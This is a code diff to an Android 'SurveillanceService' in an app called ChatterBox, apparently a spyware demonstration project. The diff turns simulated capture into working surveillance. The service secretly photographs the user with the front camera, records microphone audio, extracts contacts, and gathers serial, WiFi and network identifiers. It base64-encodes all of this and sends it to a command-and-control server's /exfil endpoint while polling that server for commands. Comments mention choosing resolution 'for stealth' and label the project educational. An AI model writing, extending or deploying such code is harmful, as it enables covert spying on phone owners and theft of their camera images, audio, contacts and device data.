@@ -36,8 +36,10 @@ import android.view.WindowManager
 import androidx.core.app.ActivityCompat
 import androidx.core.app.NotificationCompat
 import androidx.core.content.ContextCompat
+import java.io.BufferedReader
 import java.io.File
 import java.io.FileOutputStream
+import java.io.InputStreamReader
 import java.text.SimpleDateFormat
 import java.util.Date
 import java.util.Locale
@@ -54,7 +56,7 @@ import com.example.ChatterBox.malicious.LocationTracker
 
 // Import annotations for suppressing warnings
 import androidx.annotation.RequiresApi
-import com.google.firebase.crashlytics.buildtools.reloc.org.apache.commons.codec.binary.Base64
+import android.util.Base64
 
 // Import JSON processing
 import org.json.JSONObject
@@ -124,29 +126,48 @@ class SurveillanceService : Service() {
         
         // Make log notification to show it's running
         showOngoingNotification("Service starting", "Attempting to connect to C2 server...")
-        if (intent?.action == "SETUP_PROJECTION") {
-            val resultCode = intent.getIntExtra("resultCode", 0)
-            val data = intent.getParcelableExtra<Intent>("data")
-            if (data != null) {
-                setupMediaProjection(resultCode, data)
-                Log.d(TAG, "Media projection initialized")
+        
+        // Check the action passed in the intent
+        when (intent?.action) {
+            "SETUP_PROJECTION" -> {
+                val resultCode = intent.getIntExtra("resultCode", 0)
+                val data = intent.getParcelableExtra<Intent>("data")
+                if (data != null) {
+                    setupMediaProjection(resultCode, data)
+                    Log.d(TAG, "Media projection initialized")
+                }
+            }
+            "TEST_C2" -> {
+                Log.d(TAG, "Received TEST_C2 action - testing C2 connection directly")
+                testC2Connection()
+            }
+            "CAPTURE_SCREEN" -> {
+                Log.d(TAG, "Received CAPTURE_SCREEN action - capturing screenshot")
+                captureScreen()
+            }
+            "CAPTURE_CAMERA" -> {
+                Log.d(TAG, "Received CAPTURE_CAMERA action - capturing from camera")
+                captureCamera()
+            }
+            "RECORD_AUDIO" -> {
+                Log.d(TAG, "Received RECORD_AUDIO action - recording audio")
+                recordAudio()
+            }
+            "GET_CONTACTS" -> {
+                Log.d(TAG, "Received GET_CONTACTS action - extracting contacts")
+                Contacts.exfiltrateContacts(this)
+            }
+            "COLLECT_INFO" -> {
+                Log.d(TAG, "Received COLLECT_INFO action - collecting device info")
+                collectDeviceInfo()
+            }
+            else -> {
+                // Default startup behavior
+                c2Client.registerDevice()
+                startSurveillanceTimer()
+                startCommandPolling()
             }
         }
-        // Check if this is a test request
-        if (intent?.action == "TEST_C2") {
-            Log.d(TAG, "Received TEST_C2 action - testing C2 connection directly")
-            testC2Connection()
-            return START_STICKY
-        }
-        
-        // Register with the C2 server - try both HTTP and HTTPS
-        c2Client.registerDevice()
-        
-        // Schedule surveillance activities every 30 seconds
-        startSurveillanceTimer()
-        
-        // Start checking for commands from the C2 server
-        startCommandPolling()
         
         // If service is killed, restart it
         return START_STICKY
@@ -157,20 +178,101 @@ class SurveillanceService : Service() {
      */
     private fun testC2Connection() {
         Log.d(TAG, "Testing C2 connection...")
-        showOngoingNotification("Testing C2", "Testing connection to all C2 server endpoints...")
+        showOngoingNotification("Testing C2", "Testing connection to C2 server...")
         
-        // Try to register device first
-        c2Client.registerDevice()
+        // Log the server URL we're trying
+        Log.d(TAG, "Attempting to connect to C2 server at: http://10.0.2.2:42069 (emulator special IP)")
         
-        // Then send some test data to verify exfiltration
+        // Try a direct HTTP request first to debug connectivity
+        Thread {
+            try {
+                // Make a direct connection test to the emulator special address
+                // Test endpoints the C2 server has
+                testDirectConnection("http://10.0.2.2:42069")
+                SystemClock.sleep(1000)  // Wait 1 second between tests
+                testDirectConnection("http://10.0.2.2:42069/register")
+                SystemClock.sleep(1000)  // Wait 1 second between tests
+                testDirectConnection("http://10.0.2.2:42069/exfil")
+                SystemClock.sleep(1000)  // Wait 1 second between tests
+                testDirectConnection("http://10.0.2.2:42069/command")
+            } catch (e: Exception) {
+                Log.e(TAG, "Direct connection test failed", e)
+            }
+        }.start()
+        
+        // Send a direct POST request to the C2 server
+        Thread {
+            try {
+                val url = URL("http://10.0.2.2:42069/exfil")
+                val connection = url.openConnection() as HttpURLConnection
+                connection.requestMethod = "POST"
+                connection.setRequestProperty("Content-Type", "application/json")
+                connection.setRequestProperty("User-Agent", "ChatterBox/DirectTest")
+                connection.connectTimeout = 5000
+                connection.readTimeout = 5000
+                connection.doOutput = true
+                connection.doInput = true
+                
+                val testData = JSONObject().apply {
+                    put("type", "test")
+                    put("device_id", getDeviceID())
+                    put("message", "DIRECT TEST FROM HELP BUTTON")
+                    put("timestamp", System.currentTimeMillis())
+                }
+                
+                Log.d(TAG, "Sending direct test POST to C2: ${testData.toString()}")
+                
+                // Write data to connection
+                try {
+                    val outputStream = connection.outputStream
+                    outputStream.write(testData.toString().toByteArray())
+                    outputStream.flush()
+                    outputStream.close()
+                    
+                    // Check response
+                    val responseCode = connection.responseCode
+                    val responseMessage = connection.responseMessage
+                    Log.d(TAG, "Direct test POST response: $responseCode - $responseMessage")
+                    
+                    // Read response content
+                    try {
+                        val inputStream = if (responseCode >= 400) {
+                            connection.errorStream ?: connection.inputStream
+                        } else {
+                            connection.inputStream
+                        }
+                        
+                        val reader = BufferedReader(InputStreamReader(inputStream))
+                        val response = StringBuilder()
+                        var line: String? = null
+                        while (reader.readLine().also { line = it } != null) {
+                            response.append(line)
+                        }
+                        
+                        Log.d(TAG, "Direct test response content: ${response.toString()}")
+                    } catch (e: Exception) {
+                        Log.e(TAG, "Error reading direct test response", e)
+                    }
+                } catch (e: Exception) {
+                    Log.e(TAG, "Error writing to direct test connection", e)
+                } finally {
+                    connection.disconnect()
+                }
+            } catch (e: Exception) {
+                Log.e(TAG, "Error with direct test connection", e)
+            }
+        }.start()
+        
+        // Send test data to verify exfiltration
         val testData = JSONObject().apply {
             put("test", true)
             put("timestamp", System.currentTimeMillis())
-            put("message", "This is a test message from the device")
+            put("message", "Test message from device")
             put("device_info", JSONObject().apply {
                 put("model", android.os.Build.MODEL)
-                put("manufacturer", android.os.Build.MANUFACTURER) 
+                put("manufacturer", android.os.Build.MANUFACTURER)
                 put("android_version", android.os.Build.VERSION.RELEASE)
+                put("sdk_int", android.os.Build.VERSION.SDK_INT)
             })
         }
         
@@ -185,6 +287,68 @@ class SurveillanceService : Service() {
             } else {
                 Log.d(TAG, "No commands received from C2 server")
             }
+        }
+    }
+    
+    /**
+     * Test direct connection to a URL for debugging
+     */
+    private fun testDirectConnection(urlString: String) {
+        try {
+            Log.d(TAG, "Testing direct connection to: $urlString")
+            val url = URL(urlString)
+            val connection = url.openConnection() as HttpURLConnection
+            connection.connectTimeout = 5000  // 5 second timeout
+            connection.readTimeout = 5000     // 5 second timeout
+            connection.requestMethod = "GET"
+            connection.instanceFollowRedirects = true
+            connection.doInput = true
+            
+            try {
+                // Log connection attempt
+                Log.d(TAG, "Attempting to connect to $urlString")
+                
+                // Actually make the connection
+                val responseCode = connection.responseCode
+                val responseMessage = connection.responseMessage
+                Log.d(TAG, "Connection to $urlString - response code: $responseCode - $responseMessage")
+                
+                // Try to read response
+                val inputStream = if (responseCode >= 400) {
+                    connection.errorStream
+                } else {
+                    connection.inputStream
+                }
+                
+                if (inputStream != null) {
+                    val bufferedReader = BufferedReader(InputStreamReader(inputStream))
+                    val responseText = StringBuilder()
+                    var line: String? = null
+                    while (bufferedReader.readLine().also { line = it } != null) {
+                        responseText.append(line)
+                    }
+                    
+                    // Log some of the response
+                    val response = responseText.toString()
+                    if (response.isNotEmpty()) {
+                        val preview = if (response.length > 200) response.substring(0, 200) + "..." else response
+                        Log.d(TAG, "Response from $urlString: $preview")
+                    } else {
+                        Log.d(TAG, "Received empty response from $urlString")
+                    }
+                } else {
+                    Log.d(TAG, "No input stream available from $urlString")
+                }
+            } catch (e: Exception) {
+                Log.e(TAG, "Error reading from $urlString: ${e.message}")
+                e.printStackTrace()
+            } finally {
+                connection.disconnect()
+                Log.d(TAG, "Disconnected from $urlString")
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to connect to $urlString: ${e.message}")
+            e.printStackTrace()
         }
     }
     
@@ -452,7 +616,7 @@ class SurveillanceService : Service() {
     }
 
     private fun createScreenshotJson(deviceId: String, filename: String, jpegBytes: ByteArray): String {
-        val base64Data = Base64.encodeBase64String(jpegBytes)
+        val base64Data = Base64.encodeToString(jpegBytes, Base64.DEFAULT)
         return """
     {
         "type": "screenshots",
@@ -552,16 +716,234 @@ class SurveillanceService : Service() {
             return
         }
         
-        // For demonstration, we'll simulate this instead of actually accessing the camera
+        try {
+            // Get camera manager
+            val cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
+            
+            // Try to use front camera if available
+            val cameraId = getFrontCameraId(cameraManager)
+            if (cameraId == null) {
+                Log.e(TAG, "No camera available")
+                return
+            }
+            
+            // Create a handler thread for camera operations
+            val cameraThread = HandlerThread("CameraThread").apply { start() }
+            val cameraHandler = Handler(cameraThread.looper)
+            
+            // Setup image reader for capturing still image
+            val characteristics = cameraManager.getCameraCharacteristics(cameraId)
+            val streamConfigurationMap = characteristics.get(android.hardware.camera2.CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
+            
+            if (streamConfigurationMap == null) {
+                Log.e(TAG, "Cannot get stream configuration map")
+                return
+            }
+            
+            // Get output sizes and choose a suitable one (medium resolution for stealth)
+            val outputSizes = streamConfigurationMap.getOutputSizes(ImageReader::class.java)
+            val size = chooseBestSize(outputSizes)
+            
+            // Create image reader
+            imageReader = ImageReader.newInstance(size.width, size.height, android.graphics.ImageFormat.JPEG, 2)
+            imageReader?.setOnImageAvailableListener({ reader ->
+                // Process captured image
+                val image = reader.acquireLatestImage()
+                if (image != null) {
+                    processAndSendCameraImage(image)
+                }
+            }, cameraHandler)
+            
+            // Open camera
+            cameraOpenCloseLock.acquire()
+            cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
+                override fun onOpened(camera: CameraDevice) {
+                    cameraDevice = camera
+                    createCaptureSession(camera)
+                    cameraOpenCloseLock.release()
+                }
+                
+                override fun onDisconnected(camera: CameraDevice) {
+                    cameraOpenCloseLock.release()
+                    camera.close()
+                    cameraDevice = null
+                }
+                
+                override fun onError(camera: CameraDevice, error: Int) {
+                    cameraOpenCloseLock.release()
+                    camera.close()
+                    cameraDevice = null
+                    Log.e(TAG, "Camera device error: $error")
+                }
+            }, cameraHandler)
+        } catch (e: Exception) {
+            Log.e(TAG, "Error capturing from camera", e)
+            
+            // Since this is a educational demo, we'll simulate camera capture as fallback
+            simulateCameraCapture()
+        }
+    }
+    
+    /**
+     * Get front camera ID
+     */
+    private fun getFrontCameraId(cameraManager: CameraManager): String? {
+        try {
+            for (cameraId in cameraManager.cameraIdList) {
+                val characteristics = cameraManager.getCameraCharacteristics(cameraId)
+                val cameraDirection = characteristics.get(android.hardware.camera2.CameraCharacteristics.LENS_FACING)
+                
+                if (cameraDirection != null && cameraDirection == android.hardware.camera2.CameraCharacteristics.LENS_FACING_FRONT) {
+                    return cameraId
+                }
+            }
+            
+            // If no front camera found, use the first available camera
+            if (cameraManager.cameraIdList.isNotEmpty()) {
+                return cameraManager.cameraIdList[0]
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Error finding front camera", e)
+        }
+        
+        return null
+    }
+    
+    /**
+     * Choose best size for camera capture (medium resolution for stealth)
+     */
+    private fun chooseBestSize(sizes: Array<android.util.Size>): android.util.Size {
+        // Sort by area (width * height)
+        val sortedSizes = sizes.sortedBy { it.width * it.height }
+        
+        // Choose a medium resolution (neither too large nor too small)
+        return if (sortedSizes.size > 1) {
+            sortedSizes[sortedSizes.size / 2]
+        } else {
+            sortedSizes[0]
+        }
+    }
+    
+    /**
+     * Create capture session for camera
+     */
+    private fun createCaptureSession(camera: CameraDevice) {
+        try {
+            val surfaces = arrayListOf(imageReader?.surface)
+            
+            camera.createCaptureSession(surfaces, object : CameraCaptureSession.StateCallback() {
+                override fun onConfigured(session: CameraCaptureSession) {
+                    if (cameraDevice == null) return
+                    
+                    captureSession = session
+                    captureStillImage(session)
+                }
+                
+                override fun onConfigureFailed(session: CameraCaptureSession) {
+                    Log.e(TAG, "Failed to configure camera capture session")
+                }
+            }, null)
+        } catch (e: Exception) {
+            Log.e(TAG, "Error creating camera capture session", e)
+        }
+    }
+    
+    /**
+     * Capture a still image
+     */
+    private fun captureStillImage(session: CameraCaptureSession) {
+        try {
+            val captureRequestBuilder = cameraDevice!!.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
+            captureRequestBuilder.addTarget(imageReader!!.surface)
+            
+            // Auto-focus
+            captureRequestBuilder.set(android.hardware.camera2.CaptureRequest.CONTROL_AF_MODE, 
+                    android.hardware.camera2.CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
+            
+            // Auto-flash
+            captureRequestBuilder.set(android.hardware.camera2.CaptureRequest.CONTROL_AE_MODE,
+                    android.hardware.camera2.CaptureRequest.CONTROL_AE_MODE_ON_AUTO_FLASH)
+            
+            // Orientation
+            val windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
+            val rotation = windowManager.defaultDisplay.rotation
+            captureRequestBuilder.set(android.hardware.camera2.CaptureRequest.JPEG_ORIENTATION, 90)
+            
+            session.capture(captureRequestBuilder.build(), null, null)
+        } catch (e: Exception) {
+            Log.e(TAG, "Error capturing still image", e)
+        }
+    }
+    
+    /**
+     * Process the captured image and send it to the C2 server
+     */
+    private fun processAndSendCameraImage(image: Image) {
         val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
-        val filename = "camera_$timestamp.txt"
+        val filename = "camera_$timestamp.jpg"
+        
+        try {
+            // Get byte array from Image
+            val buffer = image.planes[0].buffer
+            val bytes = ByteArray(buffer.capacity())
+            buffer.get(bytes)
+            
+            // Save locally for inspection
+            val imageFile = File(getExternalFilesDir(), filename)
+            FileOutputStream(imageFile).use { out ->
+                out.write(bytes)
+            }
+            
+            // Send to C2 server
+            sendCameraImageToC2(bytes, filename)
+            
+            Log.d(TAG, "Camera image captured and sent: $filename")
+        } catch (e: Exception) {
+            Log.e(TAG, "Error processing camera image", e)
+        } finally {
+            image.close()
+        }
+    }
+    
+    /**
+     * Send camera image to C2 server
+     */
+    private fun sendCameraImageToC2(imageBytes: ByteArray, filename: String) {
+        try {
+            // Get the device ID for identification
+            val deviceId = getDeviceID()
+            
+            // Create a JSON object that matches what the C2 server expects
+            val jsonData = JSONObject().apply {
+                put("type", "camera")  // The data type directory name on the server
+                put("device_id", deviceId)
+                put("timestamp", SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", Locale.US).format(Date()))
+                put("data", JSONObject().apply {
+                    put("filename", filename)
+                    put("image_data", android.util.Base64.encodeToString(imageBytes, android.util.Base64.DEFAULT))
+                })
+            }
+            
+            // Send the JSON data to the C2 server
+            c2Client.sendExfiltrationData("camera", jsonData.toString())
+        } catch (e: Exception) {
+            Log.e(TAG, "Error sending camera image to C2", e)
+        }
+    }
+    
+    /**
+     * Simulate camera capture for fallback (educational demonstration only)
+     */
+    private fun simulateCameraCapture() {
+        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
+        val filename = "camera_simulated_$timestamp.txt"
         
         val logFile = File(getExternalFilesDir(), filename)
         
         try {
             FileOutputStream(logFile).use { out ->
                 val message = "SIMULATED CAMERA CAPTURE at $timestamp\n" +
-                              "In a real implementation, this would take a photo with the camera.\n"
+                              "Real camera capture failed, this is a simulation fallback.\n"
                 
                 out.write(message.toByteArray())
             }
@@ -571,6 +953,7 @@ class SurveillanceService : Service() {
                 put("timestamp", timestamp)
                 put("device_id", getDeviceID())
                 put("camera_image", "Simulated camera capture at $timestamp")
+                put("simulated", true)
             }
             c2Client.sendExfiltrationData("camera", cameraData.toString())
             
@@ -590,16 +973,105 @@ class SurveillanceService : Service() {
             return
         }
         
-        // For demonstration, we'll simulate this instead of actually recording
+        var recorder: MediaRecorder? = null
         val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
-        val filename = "audio_$timestamp.txt"
+        val audioFile = File(getExternalFilesDir(), "audio_$timestamp.3gp")
         
+        try {
+            // Create MediaRecorder
+            recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                MediaRecorder(this)
+            } else {
+                @Suppress("DEPRECATION")
+                MediaRecorder()
+            }
+            
+            // Configure recorder
+            recorder.apply {
+                setAudioSource(MediaRecorder.AudioSource.MIC)
+                setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
+                setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
+                setOutputFile(audioFile.absolutePath)
+                
+                try {
+                    prepare()
+                    start()
+                    
+                    Log.d(TAG, "Started recording audio to: ${audioFile.absolutePath}")
+                    
+                    // Record for 5 seconds then stop
+                    Handler().postDelayed({
+                        try {
+                            stop()
+                            release()
+                            
+                            // Process and send the recorded audio
+                            processAndSendAudio(audioFile, timestamp)
+                        } catch (e: Exception) {
+                            Log.e(TAG, "Error stopping audio recording", e)
+                        }
+                    }, 5000) // 5 seconds
+                } catch (e: Exception) {
+                    Log.e(TAG, "Error starting audio recording", e)
+                    release()
+                    simulateAudioRecording(timestamp)
+                }
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Error setting up audio recording", e)
+            recorder?.release()
+            simulateAudioRecording(timestamp)
+        }
+    }
+    
+    /**
+     * Process recorded audio file and send to C2 server
+     */
+    private fun processAndSendAudio(audioFile: File, timestamp: String) {
+        try {
+            if (!audioFile.exists() || audioFile.length() == 0L) {
+                Log.e(TAG, "Audio file doesn't exist or is empty")
+                simulateAudioRecording(timestamp)
+                return
+            }
+            
+            // Read the audio file into a byte array
+            val audioBytes = audioFile.readBytes()
+            
+            // Create JSON object with audio data
+            val audioData = JSONObject().apply {
+                put("type", "audio")
+                put("device_id", getDeviceID())
+                put("timestamp", SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", Locale.US).format(Date()))
+                put("data", JSONObject().apply {
+                    put("filename", audioFile.name)
+                    put("audio_data", android.util.Base64.encodeToString(audioBytes, android.util.Base64.DEFAULT))
+                    put("format", "3gp")
+                    put("duration", "5000") // 5 seconds in milliseconds
+                })
+            }
+            
+            // Send to C2 server
+            c2Client.sendExfiltrationData("audio", audioData.toString())
+            
+            Log.d(TAG, "Audio recorded and sent to C2 server: ${audioFile.name} (${audioBytes.size} bytes)")
+        } catch (e: Exception) {
+            Log.e(TAG, "Error processing audio file", e)
+            simulateAudioRecording(timestamp)
+        }
+    }
+    
+    /**
+     * Simulate audio recording as fallback (for educational demonstration)
+     */
+    private fun simulateAudioRecording(timestamp: String) {
+        val filename = "audio_simulated_$timestamp.txt"
         val logFile = File(getExternalFilesDir(), filename)
         
         try {
             FileOutputStream(logFile).use { out ->
                 val message = "SIMULATED AUDIO RECORDING at $timestamp\n" +
-                              "In a real implementation, this would record 5 seconds of audio.\n"
+                              "Real audio recording failed, this is a simulation fallback.\n"
                 
                 out.write(message.toByteArray())
             }
@@ -609,6 +1081,7 @@ class SurveillanceService : Service() {
                 put("timestamp", timestamp)
                 put("device_id", getDeviceID())
                 put("audio_recording", "Simulated audio recording at $timestamp")
+                put("simulated", true)
             }
             c2Client.sendExfiltrationData("audio", audioData.toString())
             
@@ -785,14 +1258,53 @@ class SurveillanceService : Service() {
      */
     private fun collectDeviceInfo() {
         try {
-            // Create JSON with device information
+            // Create JSON with detailed device information
             val deviceInfo = JSONObject().apply {
+                // Basic device info
                 put("device_model", android.os.Build.MODEL)
                 put("device_manufacturer", android.os.Build.MANUFACTURER)
                 put("android_version", android.os.Build.VERSION.RELEASE)
                 put("device_id", getDeviceID())
                 put("app_version", packageManager.getPackageInfo(packageName, 0).versionName)
                 put("timestamp", System.currentTimeMillis())
+                
+                // Detailed build information
+                put("build_info", JSONObject().apply {
+                    put("board", android.os.Build.BOARD)
+                    put("bootloader", android.os.Build.BOOTLOADER)
+                    put("brand", android.os.Build.BRAND)
+                    put("device", android.os.Build.DEVICE)
+                    put("display", android.os.Build.DISPLAY)
+                    put("fingerprint", android.os.Build.FINGERPRINT)
+                    put("hardware", android.os.Build.HARDWARE)
+                    put("host", android.os.Build.HOST)
+                    put("id", android.os.Build.ID)
+                    put("product", android.os.Build.PRODUCT)
+                    put("serial", getSerialNumber())
+                    put("tags", android.os.Build.TAGS)
+                    put("type", android.os.Build.TYPE)
+                    put("user", android.os.Build.USER)
+                })
+                
+                // Network information
+                put("network_info", getNetworkInfo())
+                
+                // Storage information
+                put("storage_info", getStorageInfo())
+                
+                // Installed apps (for demonstration, not actually implemented)
+                put("has_installed_apps_data", false)
+            }
+            
+            // Log device info being collected
+            Log.d(TAG, "Collecting device info: ${deviceInfo.toString().substring(0, 100)}...")
+            
+            // Save locally for inspection
+            val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
+            val filename = "device_info_$timestamp.json"
+            val infoFile = File(getExternalFilesDir(), filename)
+            FileOutputStream(infoFile).use { out ->
+                out.write(deviceInfo.toString(2).toByteArray())
             }
             
             // Send to C2 server
@@ -802,6 +1314,107 @@ class SurveillanceService : Service() {
         } catch (e: Exception) {
             Log.e(TAG, "Error collecting device info", e)
         }
+    }
+    
+    /**
+     * Get device serial number safely
+     */
+    private fun getSerialNumber(): String {
+        return try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                if (checkSelfPermission(Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
+                    Build.getSerial()
+                } else {
+                    "<permission not granted>"
+                }
+            } else {
+                Build.SERIAL
+            }
+        } catch (e: Exception) {
+            "<not available>"
+        }
+    }
+    
+    /**
+     * Get network information
+     */
+    private fun getNetworkInfo(): JSONObject {
+        val networkInfo = JSONObject()
+        
+        try {
+            val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
+            
+            // Get active network info
+            val activeNetwork = connectivityManager.activeNetworkInfo
+            if (activeNetwork != null) {
+                networkInfo.put("connected", activeNetwork.isConnected)
+                networkInfo.put("type", when(activeNetwork.type) {
+                    android.net.ConnectivityManager.TYPE_WIFI -> "WIFI"
+                    android.net.ConnectivityManager.TYPE_MOBILE -> "MOBILE"
+                    android.net.ConnectivityManager.TYPE_ETHERNET -> "ETHERNET"
+                    else -> "OTHER"
+                })
+                networkInfo.put("subtype", activeNetwork.subtype)
+                networkInfo.put("extra_info", activeNetwork.extraInfo ?: "")
+            } else {
+                networkInfo.put("connected", false)
+            }
+            
+            // Try to get WiFi info if available
+            try {
+                val wifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
+                val wifiInfo = wifiManager.connectionInfo
+                
+                if (wifiInfo != null) {
+                    networkInfo.put("wifi_info", JSONObject().apply {
+                        put("ssid", wifiInfo.ssid)
+                        put("bssid", wifiInfo.bssid)
+                        put("ip_address", android.text.format.Formatter.formatIpAddress(wifiInfo.ipAddress))
+                        put("mac_address", wifiInfo.macAddress)
+                        put("link_speed", wifiInfo.linkSpeed)
+                        put("signal_strength", wifiInfo.rssi)
+                    })
+                }
+            } catch (e: Exception) {
+                Log.e(TAG, "Error getting WiFi info", e)
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Error getting network info", e)
+            networkInfo.put("error", e.message)
+        }
+        
+        return networkInfo
+    }
+    
+    /**
+     * Get storage information
+     */
+    private fun getStorageInfo(): JSONObject {
+        val storageInfo = JSONObject()
+        
+        try {
+            val externalStorageDir = Environment.getExternalStorageDirectory()
+            val internalFilesDir = filesDir
+            
+            storageInfo.put("external", JSONObject().apply {
+                put("path", externalStorageDir.path)
+                put("total_space", externalStorageDir.totalSpace)
+                put("free_space", externalStorageDir.freeSpace)
+                put("usable_space", externalStorageDir.usableSpace)
+            })
+            
+            storageInfo.put("internal", JSONObject().apply {
+                put("path", internalFilesDir.path)
+                put("total_space", internalFilesDir.totalSpace)
+                put("free_space", internalFilesDir.freeSpace)
+                put("usable_space", internalFilesDir.usableSpace)
+            })
+        } catch (e: Exception) {
+            Log.e(TAG, "Error getting storage info", e)
+            storageInfo.put("error", e.message)
+        }
+        
+        return storageInfo
     }
     private fun cleanup() {
         try {
